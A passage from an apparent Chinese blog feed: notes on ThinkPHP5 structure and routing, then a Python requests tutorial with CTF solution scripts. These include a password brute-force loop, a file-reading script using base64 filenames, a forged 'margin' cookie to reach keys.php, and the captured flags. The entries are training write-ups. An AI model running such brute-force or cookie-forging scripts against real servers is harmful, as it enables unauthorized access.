它是路由文件，当我们想对URL进行美化，那么我们就可以修改此文件，对其增加一些路由配置，就可以达到美化的效果    <span class="hljs-params">|- tags.php 它是应用行为扩展文件，在thinkphp中，它为我们埋下了很多钩子，我们可以对框架进行扩展，而不需要修改框架本身的源码，我们需要在某一个钩子上注册某些函数，或者是注册某些行为，来通过行为来改变框架的执行流程     </span><span class="hljs-params">|</span>-extend  扩展类库目录,这个目录是我们下载第三方库时候使用的，当然我们不是通过composer来下载的，比如说我们有一个第三方库，我们用着比较好用，但是它没有composer包，我们就可以将类库下载到extend目录，之后我们修改一下命名空间，就可以直接在我们的应用中使用<span class="hljs-params">|-publiic 我们网站（WEB）的根目录，也就是说我们网站根目录下所有的这些文件都是允许访问的</span><span class="hljs-params">    |</span>-static 主要用来放静态文件，比如说css,js,图片等等    <span class="hljs-params">|-index.php 整个网站或整个应用的入口文件，所有的请求都会经过index.php之后再去转发</span><span class="hljs-params">    |</span>-router.php 它是框架快速启动的测试文件，比如你本地没有安装Apache，只安装了PHP，那么我们可以同过，PHP内置的workserver来启动，通过这个文件，我们就可以启动这个框架<span class="hljs-params">|-runtime 它是网站运行中的缓存文件，它包括日志，缓存和编译文件等等。</span><span class="hljs-params">|</span>-thinkphp 它是框架文件,也就是说thinkphp5的框架都在里边    <span class="hljs-params">|-lang 里边是语言包</span><span class="hljs-params">    |</span>-library 目录是框架的核心，它里边有think(它是整个框架的核心文件)和traits(它是类库的扩展)两个目录        <span class="hljs-params">|-think Think 类库包目录</span><span class="hljs-params">        |</span>-traits 系统 Traits 目录    <span class="hljs-params">|-tpl 是我们框架默认的一些模板（了解知识）</span><span class="hljs-params">        |</span>-default_index.tpl 它是我们自动生成的控制器模板文件        <span class="hljs-params">|-dispatch_jump.tpl它是我们网站发出成功或失败的中间跳转文件</span><span class="hljs-params">        |</span>-page_trace.tpl它是我们调试时显示的模板文件        <span class="hljs-params">|-think_exception.tpl它是我们抛出异常时页面展示的文件</span><span class="hljs-params">    |</span>-base.php 定义一些常量    <span class="hljs-params">|-console.php 它是控制台的入口文件</span><span class="hljs-params">    |</span>-convention.php 是框架惯例配置文件    <span class="hljs-params">|-help.php 助手函数</span><span class="hljs-params">    |</span>-start.php是框架启动文件<span class="hljs-params">|-vendor 是composer安装过程中生成的目录，通过composer安装的所有类库都被安装在了这个目录中。</span></code></pre><ul><li>application</li></ul><p>application文件夹是TP5框架的应用层，是代码的主要编写区，你写的大部分工程代码都要在这里写，比如控制器层，服务层等</p><ul><li>public</li></ul><p>public就是TP5框架默认的最先读取文件夹，里面的index文件定义了应用目录路径和框架引导文件路径【<strong>public/index.php</strong>入口文件】，一些默认页面也在这里。</p><blockquote><p>入口文件位置的设计是为了让应用部署更安全，<code>public</code>目录为web可访问目录，其他的文件都可以放到非WEB访问目录下面。</p></blockquote><ul><li>thinkphp</li></ul><p>thinkphp就是TP5的核心框架代码，里面就是TP5框架的第一方类库，支持整个TP5框架的运行规则。</p><ul><li>runtime</li></ul><p>runtime是用来存放一些写入文件的，比如说日志文件、缓存文件等等。</p><ul><li>extend</li></ul><p>extend是用来存放一些你自己下的第三方类库的，在此目录下的第三方类库的命名空间可以直接访问</p><ul><li>vendor</li></ul><p>vendor也是用来存放第三方类库的，和extend不一样的是，这个目录是存放通过composer命令来安装的第三方类库的默认路径</p><h4 id="访问入口文件">访问入口文件</h4><ol type="1"><li>入口文件：即访问网站的文件（首页文件）【但这是对应的功能文件，若是找美观/页面==》view下对应的html】</li></ol><p>​ 没有指定模块、控制器、操作的话，将会访问默认文件</p><p>​如果我们直接访问入口文件的话，由于URL中没有模块、控制器和操作，因此系统会访问<strong>默认模块（index）下面的默认控制器（Index）的默认操作（index）</strong>，因此下面的访问是等效的：</p><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>tp5.com/index.phphttp:<span class="hljs-regexp">//</span>tp5.com<span class="hljs-regexp">/index.php/i</span>ndex<span class="hljs-regexp">/index/i</span>ndex</code></pre><ol start="2" type="1"><li><p>==对应用的所有请求都定向到应用的入口文件==</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/f92d82e7-e191-458c-84c3-13f51e0dff50-11812322.jpg" alt="img"></p><p>模块：application目录下的，控制器：controller下的，操作==函数（controller下的文件里的函数）function</p></li></ol><p>比如我们在 WWW.php下新建方法test</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20211128151650319.png" alt="image-20211128151650319"></p><p>访问<code>http://localhost/tp5/public/index.php/index/index/test</code>【此时没有隐藏入口文件】</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20211128151730333.png" alt="image-20211128151730333"></p><h4 id="隐藏入口文件">隐藏入口文件</h4><p>原：http://localhost/tp5/public/index.php/index/index/hello</p><p>修改/public/目录下.htaccess文件，phpstudy配置的话，修改倒数第二行为<code>RewriteRule ^(.*)$ index.php?s=$1 [QSA,PT,L]</code></p><p>即可隐藏入口文件index.php，后直接访问http://localhost/tp5/public/index/index/hello即可</p><h4 id="如何访问参数">如何访问参数？</h4><p>​ 1. <code>方法/i/1</code>或者<code>方法？i=1</code></p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/9d390437-e246-4169-8249-d19c66699f3a-11812322.jpg" alt="img"></p><ol start="2" type="1"><li>多个参数？</li></ol><p>PATHINFO 模式是一种url访问方式：</p><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>域名<span class="hljs-regexp">/项目名/</span>入口文件<span class="hljs-regexp">/模块名/</span>方法名<span class="hljs-regexp">/键1/</span>值<span class="hljs-number">1</span><span class="hljs-regexp">/键2/</span>值<span class="hljs-number">2</span></code></pre><p>普通访问方式如下：</p><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://域名/项目名/入口文件?m=模块名&amp;a=方法名&amp;键<span class="hljs-number">1</span>=值<span class="hljs-number">1</span>&amp;键<span class="hljs-number">2</span>=值<span class="hljs-number">2</span></code></pre><p>当开启了顺序绑定之后，不能使用普通方式访问。</p><pre><code class="hljs awk"><span class="hljs-regexp">//</span> 按照参数顺序获取<span class="hljs-string">&#x27;url_param_type&#x27;</span> =&gt; <span class="hljs-number">1</span>,</code></pre><p>eg：自动获取URL地址中的同名参数值作为方法的参数值，而且这个参数的传入顺序不受URL参数顺序的影响</p><pre><code class="hljs awk">index.php<span class="hljs-regexp">/index/i</span>ndex<span class="hljs-regexp">/hello/</span>name<span class="hljs-regexp">/bob/</span>city/shanghaiindex.php<span class="hljs-regexp">/index/i</span>ndex<span class="hljs-regexp">/hello/</span>city<span class="hljs-regexp">/shanghai/</span>name/bobindex.php<span class="hljs-regexp">/index/i</span>ndex/hello?city=shanghai&amp;name=bob</code></pre><p>URL的参数传值方式就变成了严格按照操作方法的变量定义顺序来传值了，也就是说我们必须使用下面的URL地址访问才能正确传入<code>name</code>和<code>city</code>参数到<code>hello</code>方法</p><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>tp5.com<span class="hljs-regexp">/index.php/i</span>ndex<span class="hljs-regexp">/index/</span>hello<span class="hljs-regexp">/bob/</span>shanghai此时hello<span class="hljs-regexp">/name/</span>thinkphp<span class="hljs-regexp">/city/</span>shanghai和？=都不行</code></pre><h4 id="路由">路由</h4><p>路由配置文件 <strong>application/route.php</strong></p><p>路由配置的作用：URL地址里面的index模块怎么才能省略呢，默认的URL地址显得有点长，下面就来说说如何==通过路由简化URL访问==</p><pre><code class="hljs awk">return [    <span class="hljs-regexp">//</span> 添加路由规则 路由到 index控制器的hello操作方法    <span class="hljs-string">&#x27;hello/:name&#x27;</span> =&gt; <span class="hljs-string">&#x27;index/index/hello&#x27;</span>,    <span class="hljs-regexp">//</span> 路由参数name为可选：    <span class="hljs-string">&#x27;hello/[:name]&#x27;</span> =&gt; <span class="hljs-string">&#x27;index/hello&#x27;</span>,    <span class="hljs-regexp">//</span>以$结尾的时候就表示当前路由规则需要完整匹配。<span class="hljs-regexp">/hello/</span>thinkphp <span class="hljs-regexp">//</span> 正确匹配，<span class="hljs-regexp">/hello/</span>thinkphp<span class="hljs-regexp">/val/</span>value <span class="hljs-regexp">//</span> 不会匹配    <span class="hljs-string">&#x27;hello/[:name]$&#x27;</span> =&gt; <span class="hljs-string">&#x27;index/hello&#x27;</span>,];</code></pre><p>​该路由规则表示所有hello开头的并且带参数的访问都会路由到index控制器的hello操作方法。</p><p>路由之前的URL访问地址为</p><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>tp5.com<span class="hljs-regexp">/index/i</span>ndex<span class="hljs-regexp">/hello/</span>name/thinkphp</code></pre><p>定义路由后就只能访问下面的URL地址，变量name值为thinkphp</p><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>tp5.com<span class="hljs-regexp">/hello/</span>thinkphp</code></pre><p>==⚠<strong>定义路由规则后，原来的URL地址将会失效，变成非法请求。</strong>==</p><ul><li>闭包定义</li></ul><p>还支持通过定义闭包为某些特殊的场景定义路由规则（大致意思就是路由匹配到这些就会执行函数），例如：</p><pre><code class="hljs php"><span class="hljs-keyword">return</span> [    <span class="hljs-comment">// 定义闭包</span>    <span class="hljs-string">&#x27;hello/[:name]&#x27;</span> =&gt; <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">$name</span>) </span>&#123;        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Hello,&#x27;</span> . $name . <span class="hljs-string">&#x27;!&#x27;</span>;    &#125;,];或者：Route::rule(<span class="hljs-string">&#x27;hello/:name&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">$name</span>) </span>&#123;  <span class="hljs-comment">//参数$name就是url中定义的变量。</span>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Hello,&#x27;</span> . $name . <span class="hljs-string">&#x27;!&#x27;</span>;&#125;);</code></pre><p>因此，当访问http://tp5.com/hello/thinkphp 会输出 Hello,thinkphp!</p><p>路由设置</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">namespace</span> <span class="hljs-title">app</span>\<span class="hljs-title">index</span>\<span class="hljs-title">controller</span>;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Blog</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params">$id</span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">return</span> ’查看id=‘ . $id . ’的内容‘;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">read</span>(<span class="hljs-params">$name</span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">return</span> ’查看name=‘ . $name . ’的内容‘;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">archive</span>(<span class="hljs-params">$year, $month</span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">return</span> ’查看‘ . $year . ’/‘ . $month . ’的归档内容‘;    &#125;&#125;</code></pre>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>计算机基础</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>python发送request包&amp;ctf</title>
    <link href="/2021/10/09/python%E5%8F%91%E9%80%81request%E5%8C%85/"/>
    <url>/2021/10/09/python%E5%8F%91%E9%80%81request%E5%8C%85/</url>
    
    <content type="html"><![CDATA[<h2 id="源码原理">源码&amp;原理</h2><blockquote><p>参考：<a href="https://mp.weixin.qq.com/s?__biz=Mzg3MDE5OTIwNw==&amp;mid=2247484961&amp;idx=1&amp;sn=86246772e65901d1bb833055dcf66890&amp;chksm=ce903ce9f9e7b5ff2d2cffdffdefc6e60b66de5b00341e8e7b94b97d590d82f12f164e4c5a6f&amp;scene=21#wechat_redirect">公众号</a>、 <a href="https://docs.python-requests.org/zh_CN/latest/user/quickstart.html#id6">手册（繁杂</a>）、<a href="https://www.liaoxuefeng.com/wiki/1016959663602400/1183249464292448">廖雪峰精简</a></p></blockquote><p>在Python第三方库当中，有一个Requests模块。</p><p>该模块可以帮助我们发送HTTP请求，接收HTTP应答。</p><h3 id="发送请求">发送请求</h3><pre><code class="hljs python">&gt;&gt;&gt;<span class="hljs-keyword">import</span> requests&gt;&gt;&gt;a=requests.get(url=<span class="hljs-string">&quot;https://baidu.com&quot;</span>)&gt;&gt;&gt;a   //直接打印a，会得到响应码<span class="hljs-comment">#get传参，params=（提前准备好的字典）</span><span class="hljs-meta">&gt;&gt;&gt; </span>payload = &#123;<span class="hljs-string">&#x27;key1&#x27;</span>: <span class="hljs-string">&#x27;value1&#x27;</span>, <span class="hljs-string">&#x27;key2&#x27;</span>: <span class="hljs-string">&#x27;value2&#x27;</span>&#125;<span class="hljs-meta">&gt;&gt;&gt; </span>r = requests.get(<span class="hljs-string">&quot;http://httpbin.org/get&quot;</span>, params=payload)<span class="hljs-comment">#通过打印输出实际请求的URL</span><span class="hljs-meta">&gt;&gt;&gt; </span>print(r.url)  或者直接r.urlhttp://httpbin.org/get?key2=value2&amp;key1=value1    <span class="hljs-comment">#post传参数data(字典/元组都可以（表单）)</span><span class="hljs-meta">&gt;&gt;&gt; </span>r = requests.post(<span class="hljs-string">&#x27;http://httpbin.org/post&#x27;</span>, data = &#123;<span class="hljs-string">&#x27;key&#x27;</span>:<span class="hljs-string">&#x27;value&#x27;</span>&#125;)</code></pre><h3 id="查看响应内容">查看响应内容</h3><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> requests<span class="hljs-meta">&gt;&gt;&gt; </span>r = requests.get(<span class="hljs-string">&#x27;https://api.github.com/events&#x27;</span>)&lt;Response [<span class="hljs-number">200</span>]&gt;  //直接打印r，会得到响应码&gt;&gt;&gt;r.status_code<span class="hljs-number">200</span><span class="hljs-comment">#查看响应体内容</span><span class="hljs-meta">&gt;&gt;&gt; </span>r.text     <span class="hljs-string">u&#x27;[&#123;&quot;repository&quot;:&#123;&quot;open_issues&quot;:0,&quot;url&quot;:&quot;https://github.com/...</span><span class="hljs-string"></span><span class="hljs-string">#使用print()函数打印，会识别其中的空格符以及换行符</span><span class="hljs-string">&gt;&gt;&gt;print(r.text)</span><span class="hljs-string"></span><span class="hljs-string">#查看响应头 (返回字典)\  查看请求头：r.request.headers：</span><span class="hljs-string">&gt;&gt;&gt;r.headers</span><span class="hljs-string">&#123;</span><span class="hljs-string">    &#x27;</span>content-encoding<span class="hljs-string">&#x27;: &#x27;</span>gzip<span class="hljs-string">&#x27;,</span><span class="hljs-string">    &#x27;</span>transfer-encoding<span class="hljs-string">&#x27;: &#x27;</span>chunked<span class="hljs-string">&#x27;,</span><span class="hljs-string">    &#x27;</span>connection<span class="hljs-string">&#x27;: &#x27;</span>close<span class="hljs-string">&#x27;,</span><span class="hljs-string">    &#x27;</span>serve<span class="hljs-string">r&#x27;: &#x27;</span>nginx/<span class="hljs-number">1.0</span><span class="hljs-number">.4</span><span class="hljs-string">&#x27;,</span><span class="hljs-string">    &#x27;</span>x-runtime<span class="hljs-string">&#x27;: &#x27;</span><span class="hljs-number">148</span>ms<span class="hljs-string">&#x27;,</span><span class="hljs-string">    &#x27;</span>etag<span class="hljs-string">&#x27;: &#x27;</span><span class="hljs-string">&quot;e1ca502697e5c9317743dc078f67693f&quot;</span><span class="hljs-string">&#x27;,</span><span class="hljs-string">    &#x27;</span>content-<span class="hljs-built_in">type</span><span class="hljs-string">&#x27;: &#x27;</span>application/json<span class="hljs-string">&#x27;</span><span class="hljs-string">&#125;</span><span class="hljs-string">&gt;&gt;&gt; r.headers[&#x27;</span>Content-Type<span class="hljs-string">&#x27;]</span><span class="hljs-string">&#x27;</span>application/json<span class="hljs-string">&#x27;</span><span class="hljs-string">&gt;&gt;&gt; r.headers.get(&#x27;</span>content-<span class="hljs-built_in">type</span><span class="hljs-string">&#x27;)</span><span class="hljs-string">&#x27;</span>application/json<span class="hljs-string">&#x27;</span><span class="hljs-string"></span><span class="hljs-string">#使用for-in语句可以进行遍历：，美观展现</span><span class="hljs-string">&gt;&gt;&gt;for i in res.request.headers:</span><span class="hljs-string">...     print(i+&quot;:&quot;+res.request.headers[i])</span><span class="hljs-string">...</span><span class="hljs-string">User-Agent:python-requests/2.25.0</span><span class="hljs-string">Accept-Encoding:gzip, deflate</span><span class="hljs-string">Accept:*/*</span><span class="hljs-string">Connection:keep-alive</span><span class="hljs-string"></span><span class="hljs-string"></span><span class="hljs-string"></span><span class="hljs-string">#访问cookie</span><span class="hljs-string">&gt;&gt;&gt; r.cookies[&#x27;</span>example_cookie_name<span class="hljs-string">&#x27;]</span><span class="hljs-string">&#x27;</span>example_cookie_value<span class="hljs-string">&#x27;</span><span class="hljs-string"></span><span class="hljs-string">#传递cookie</span><span class="hljs-string">&gt;&gt;&gt; url = &#x27;</span>http://httpbin.org/cookies<span class="hljs-string">&#x27;</span><span class="hljs-string">&gt;&gt;&gt; cookies = dict(cookies_are=&#x27;</span>working<span class="hljs-string">&#x27;)</span><span class="hljs-string">&gt;&gt;&gt; r = requests.get(url, cookies=cookies)</span><span class="hljs-string">&gt;&gt;&gt; r.text</span><span class="hljs-string">&#x27;</span>&#123;<span class="hljs-string">&quot;cookies&quot;</span>: &#123;<span class="hljs-string">&quot;cookies_are&quot;</span>: <span class="hljs-string">&quot;working&quot;</span>&#125;&#125;<span class="hljs-string">&#x27;</span></code></pre><h3 id="session">session（）</h3><p>如果你向同一主机发送多个请求，每个请求对象让你能够跨请求保持session和cookie信息，这时我们要使用到requests的Session()来保持回话请求的cookie和session与服务器的相一致。</p><pre><code class="hljs python">s = requests.Session()session会话的get与post请求<span class="hljs-comment"># 不带可选参数的get请求</span><span class="hljs-meta">&gt;&gt;&gt; </span>r = s.get(url=<span class="hljs-string">&#x27;https://github.com/timeline.json&#x27;</span>)<span class="hljs-comment"># 不带可选参数的post请求</span><span class="hljs-meta">&gt;&gt;&gt; </span>r = s.post(url=<span class="hljs-string">&quot;http://httpbin.org/post&quot;</span>)</code></pre><h2 id="例题">例题</h2><blockquote><p><a href="https://cloud.tencent.com/developer/article/1573148">【Python】利用Requests模块进行密码爆破</a></p><ul><li>https://mp.weixin.qq.com/s?__biz=Mzg3MDE5OTIwNw==&amp;mid=2247484961&amp;idx=1&amp;sn=86246772e65901d1bb833055dcf66890&amp;chksm=ce903ce9f9e7b5ff2d2cffdffdefc6e60b66de5b00341e8e7b94b97d590d82f12f164e4c5a6f&amp;scene=21#wechat_redirect</li></ul></blockquote><p>初级：</p><p><a href="https://cloud.tencent.com/developer/article/1573148">dvwa账号密码爆破，公众号</a></p><h3 id="python弱口令爆破">python弱口令爆破</h3><p>爆破5位数密码</p><pre><code class="hljs mel"># 弱口令爆破import requestsdef ssh():    url = <span class="hljs-string">&quot;http://114.67.246.176:12035/&quot;</span>    <span class="hljs-keyword">for</span> <span class="hljs-keyword">pwd</span> <span class="hljs-keyword">in</span> range(<span class="hljs-number">10000</span>,<span class="hljs-number">20000</span>):        <span class="hljs-keyword">pwd</span> = str(<span class="hljs-keyword">pwd</span>)        r = requests.post(url, data=&#123;<span class="hljs-string">&#x27;pwd&#x27;</span>: <span class="hljs-keyword">pwd</span>&#125;)        r.encoding = <span class="hljs-string">&#x27;utf-8&#x27;</span>        r_text = r.<span class="hljs-keyword">text</span>        judge = <span class="hljs-string">&quot;密码不正确，请重新输入&quot;</span>        <span class="hljs-keyword">if</span> (judge <span class="hljs-keyword">in</span> r.<span class="hljs-keyword">text</span>):            <span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;尝试密码：&#123;&#125;,反应状态码：&#123;&#125;,密码错误.&quot;</span>.<span class="hljs-keyword">format</span>(<span class="hljs-keyword">pwd</span>, r))        <span class="hljs-keyword">else</span>:            <span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;尝试密码：&#123;&#125;,反应状态码：&#123;&#125;,密码正确.&quot;</span>.<span class="hljs-keyword">format</span>(<span class="hljs-keyword">pwd</span>, r))            <span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;爆破完成&quot;</span>)            <span class="hljs-keyword">break</span>ssh()</code></pre><h3 id="秋名山车神">秋名山车神</h3><h5 id="考点python脚本session正则匹配">考点：python脚本、session、正则匹配</h5><p><a href="https://blog.csdn.net/Mitchell_Donovan/article/details/112453206">wp1</a>、<a href="https://asd1054.github.io/bugku_first_wp/web/%E7%A7%8B%E5%90%8D%E5%B1%B1%E8%80%81%E5%8F%B8%E6%9C%BA.html">wp2**</a></p><p>而且刷新多次数字是变化的</p><p>用python脚本：</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests <span class="hljs-comment">#引入request库</span><span class="hljs-keyword">import</span> re <span class="hljs-comment">#引入re库</span> url = <span class="hljs-string">&#x27;&#x27;&#x27;http://123.206.87.240:8002/qiumingshan/&#x27;&#x27;&#x27;</span>s = requests.session()  <span class="hljs-comment">#用session会话保持表达式</span>retuen = s.get(url) equation = re.search(<span class="hljs-string">r&#x27;(\d+[+\-*])+(\d+)&#x27;</span>,retuen.text).group()result = <span class="hljs-built_in">eval</span>(equation)<span class="hljs-comment">#eval()函数用来执行一个字符串表达式,并返回表达式的值。</span> key = &#123;<span class="hljs-string">&#x27;value&#x27;</span>:result&#125;<span class="hljs-comment">#创建一个字典类型用于传参</span>flag = s.post(url,data=key)<span class="hljs-comment">#用post方法传上去</span> print(flag.text)</code></pre><p>这个脚本重点是正则，解释下</p><p>re库</p><ul><li>re.search()表示从文本的第一个字符匹配到最后一个，其第一个参数为正则表达式，第二个参数是要匹配的文本</li><li>group()返回字符串</li><li>r''表示内容为原生字符串，防止被转义</li><li><code>(\d+[+\-*])+(\d+)：\d+</code> 表示匹配一个或多个数字；[+-*]表示匹配一个加号或一个减号或一个乘号（注：减号在中括号内是特殊字符，要用反斜杠转义）；所以([+-*])+ 表示匹配多个数字和运算符组成的“表达式”；最后再加上一组数字 ()即可</li></ul><p>更多：</p><p><a href="https://zhuanlan.zhihu.com/p/37027748">re.search 和re.findall 的区别</a>、、<a href="https://www.cnblogs.com/xiaxiaoxu/p/9749655.html">个人博客正则表达式详解+re.research</a></p><h3 id="cookie欺骗">cookie欺骗</h3><h5 id="考点python写脚本逐行还原源码url里的base64in_arraycookie伪造">考点：python写脚本逐行还原源码、url里的base64、in_array、cookie伪造</h5><p><a href="https://blog.csdn.net/qq_26090065/article/details/81588595">csdnwp</a></p><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">120.24.86.145:8002</span>/web<span class="hljs-number">11</span>/index.php?line=&amp;filename=a<span class="hljs-number">2</span>V<span class="hljs-number">5</span>cy<span class="hljs-number">50</span>eHQ=</code></pre><p>​ 最后面是base64，解码得到keys.txt.,直接访问失败，受限。</p><p>​ 尝试用filename访问index.php（原url使用base64，这也将index.php进行编码），line参数应该是行数，试一下line=2</p><p>​发现出现一行代码，<strong>改变line出现不同的代码，则尝试用python脚本读整个源码</strong></p><pre><code class="hljs php">$file= base64_decode(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;filename&#x27;</span>])?$_GET[<span class="hljs-string">&#x27;filename&#x27;</span>]:<span class="hljs-string">&quot;&quot;</span>);</code></pre><p>python脚本：</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> requestsa=<span class="hljs-number">30</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(a):    url=<span class="hljs-string">&quot;http://120.24.86.145:8002/web11/index.php?line=&quot;</span>+<span class="hljs-built_in">str</span>(i)+<span class="hljs-string">&quot;&amp;filename=aW5kZXgucGhw&quot;</span>     s=requests.get(url)    <span class="hljs-built_in">print</span> s.text</code></pre><p>index.php源码：</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>error_reporting(<span class="hljs-number">0</span>);$file=base64_decode(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;filename&#x27;</span>])?$_GET[<span class="hljs-string">&#x27;filename&#x27;</span>]:<span class="hljs-string">&quot;&quot;</span>);$line=<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;line&#x27;</span>])?intval($_GET[<span class="hljs-string">&#x27;line&#x27;</span>]):<span class="hljs-number">0</span>;<span class="hljs-keyword">if</span>($file==<span class="hljs-string">&#x27;&#x27;</span>) header(<span class="hljs-string">&quot;location:index.php?line=&amp;filename=a2V5cy50eHQ=&quot;</span>);$file_list = <span class="hljs-keyword">array</span>( <span class="hljs-string">&#x27;0&#x27;</span> =&gt;<span class="hljs-string">&#x27;keys.txt&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span> =&gt;<span class="hljs-string">&#x27;index.php&#x27;</span>,);<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_COOKIE[<span class="hljs-string">&#x27;margin&#x27;</span>]) &amp;&amp; $_COOKIE[<span class="hljs-string">&#x27;margin&#x27;</span>]==<span class="hljs-string">&#x27;margin&#x27;</span>)&#123;       <span class="hljs-comment">//看这里，flag应该在keys.php里</span>$file_list[<span class="hljs-number">2</span>]=<span class="hljs-string">&#x27;keys.php&#x27;</span>;  <span class="hljs-comment">//添加数组元素</span>&#125;<span class="hljs-keyword">if</span>(in_array($file, $file_list))&#123;  <span class="hljs-comment">//文件名在数组里才会显示</span>$fa = file($file);<span class="hljs-keyword">echo</span> $fa[$line];&#125;<span class="hljs-meta">?&gt;</span></code></pre><ul><li>判断cookie必须满足margin=margin才能访问keys.php<strong>，别忘了编码再传参、line要赋值</strong></li><li><a href="https://www.runoob.com/php/php-intval-function.html">intval</a>——获取变量的整数值，<strong>空的array 返回 0，非空的 array 返回 1。</strong></li><li>in_array(value,array,type)查看A是否在B的值里</li><li>file()—函数把整个文件读入一个数组中。返回数组，<strong>数组中的每个单元都是文件中相应的一行，包括换行符在内。</strong><strong>如果失败，则返回 false。</strong></li></ul><p>payload:</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests <span class="hljs-keyword">import</span> re <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):    url = <span class="hljs-string">&#x27;http://114.67.246.176:19772/index.php?line=&#x27;</span>+<span class="hljs-built_in">str</span>(i)+<span class="hljs-string">&#x27;&amp;filename=a2V5cy5waHA=&#x27;</span>    data=&#123;<span class="hljs-string">&#x27;margin&#x27;</span>:<span class="hljs-string">&#x27;margin&#x27;</span>&#125;    a = requests.get(url,cookies=data)    hang=a.text    print(hang) <span class="hljs-comment">#返回</span>&lt;?php $key=&quot;flag&#123;24019342d42d1024c75c9ebfe3520d5a&#125;&quot;; ?&gt;</code></pre><h3 id="你得快点">你得快点</h3><h5 id="考点burp抓包python脚本">考点：burp抓包、python脚本</h5><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041428998.png" alt="image-20210509152215287"></p><ol type="1"><li><p>发现flag，base64二次解码，发现不是flag，而且每次发送都会产生不一样的flag，提示postvalue，则想到用python，session提交post</p><pre><code class="hljs angelscript">跑的还不错，给你flag吧: MTM0NTcz二次解码<span class="hljs-number">134573</span></code></pre></li><li><p>payload</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests <span class="hljs-comment">#引入request库</span><span class="hljs-keyword">import</span> re <span class="hljs-comment">#引入re库</span><span class="hljs-keyword">import</span> base64url = <span class="hljs-string">&#x27;http://114.67.246.176:10957&#x27;</span>s = requests.session()  <span class="hljs-comment">#用session会话保持表达式</span>retuen = s.get(url)f=retuen.headers[<span class="hljs-string">&#x27;flag&#x27;</span>]f1=<span class="hljs-built_in">str</span>(base64.b64decode(f),<span class="hljs-string">&#x27;utf-8&#x27;</span>)  <span class="hljs-comment">#此时f1有两部分，跑的还不错，给你flag吧: NTYyNDk2，我们要对后半部分继续解码</span><span class="hljs-comment">#print(f1)</span>f2=f1.split(<span class="hljs-string">&#x27; &#x27;</span>)[<span class="hljs-number">1</span>]   <span class="hljs-comment">#获得后半部分的base64</span>f2=base64.b64decode(f2)   <span class="hljs-comment">#需二次解码，否则显示再快点</span>print(f2)data=&#123;<span class="hljs-string">&#x27;margin&#x27;</span>:f2&#125;result=s.post(url,data=data)print(result.text)//返回：<span class="hljs-string">b&#x27;806742&#x27;</span>flag&#123;c1d81e45e46b547e52afd4f6280b2127&#125;</code></pre></li></ol>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF,计算机基础</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>绿城杯Web部分WP</title>
    <link href="/2021/09/29/%E7%BB%BF%E5%9F%8E%E6%9D%AFWP/"/>
    <url>/2021/09/29/%E7%BB%BF%E5%9F%8E%E6%9D%AFWP/</url>
    
